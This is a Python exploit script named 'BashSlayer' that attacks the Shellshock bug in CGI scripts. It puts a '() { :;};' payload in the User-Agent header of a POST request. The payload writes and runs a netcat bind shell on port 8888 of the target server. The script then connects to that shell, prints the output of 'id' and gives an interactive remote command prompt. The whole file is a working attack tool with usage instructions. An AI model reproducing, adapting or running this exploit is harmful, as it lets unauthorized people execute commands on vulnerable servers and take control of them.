#!/usr/bin/python

import socket
import sys
import os
import time
import requests
from threading import Thread

def banner():
    os.system('clear')
    print '''
_____________________________________________________________
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
      / |
     || |
     || |
     || | BashSlayer v1.0
     || |  
     || |
     || | Written by Kory Findley < K0FIN >
     || | Copyright (C) 2014-2015 << LETHAL Security >>
     || | http://www.lethalsecurity.com/
     || |
     || |
     || |
     || |
   <======>
      ||
      ||
      ||  
     {:;}


Available Commands >> 
                      > ./bslayer.py [url] [payload]
                      > ./bslayer payloads

E.X   >> ./bslayer.py http://localhost/cgi-bin/file.sh bind
_____________________________________________________________
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

    '''

def slayer_shell(attack_socket):
    while True:
        command = raw_input('$slayershell~>')
        if command == 'exit':
            attack_socket.close()
            sys.exit()
        attack_socket.send(command + '\necho\n')
        time.sleep(.2)
        output = attack_socket.recv(1024)
        print output

def slayer_reverse(host,shell_port,thread):
    s_sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

def payload_info():
    print 'Available Payloads'
    print '============================================='
    print '[ 1 ]Netcat Bind Shell    (nc_bind)'
    print '============================================='

def slayer_grab_id(socket):
    socket.send('id\necho\n')
    print '-' * 60
    print 'ID: ' + socket.recv(1024).strip()
    print '-' * 60 + '\n'

def slayer_bind(host,shell_port):
    s_sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        s_sock.connect((host,shell_port))
        raw_input('[>]Socket Established. Press [ENTER] To Start Command Shell- ')
        slayer_grab_id(s_sock)
        slayer_shell(s_sock)
    except Exception:
        print '[-]Could not establish a socket to the injected netcat listener.'
        print '[-]Target /bin/bash interpreter probably patched.'

def async_post(target,headers):
    send_payload = requests.post(target, headers=headers)

def async_post_threader(sync_thread):
    sync_thread.start()

class Payloads:
    def __init__(self, target, port):
        self.target = target
        self.port = port
    
    def async_post(self,headers):
        send_payload = requests.post(self.target, headers=headers)
    
    def netcat_bind_shell(self):
        header = 'User-Agent'
        payload = "() { :;}; echo 'netcat -e '/bin/sh' -l -p %s' >/tmp/netcat.sh;/bin/bash /tmp/netcat.sh &" % (self.port)
        headers = {header:payload}
        init_thread = Thread(target=async_post, args=(self.target,headers))
        init_thread.daemon = True
        async_post_threader(init_thread)
                
        print "[*]Bind shell payload sent."
        hostname = self.target.split('//')[1].split('/')[0]
        time.sleep(.2)
        slayer_bind(hostname,self.port)
                  
def main():
    banner()
    host = sys.argv[1]
    if host == 'payloads' or host == 'PAYLOADS' or host == 'Payloads':
        payload_info()
        sys.exit()
    shell_type = sys.argv[2]
    shell_port = 8888
    if shell_type == 'nc_bind':
        bind_shell = Payloads(host,shell_port)
        bind_shell.netcat_bind_shell()
try:    
    main()
except IndexError:
    banner()
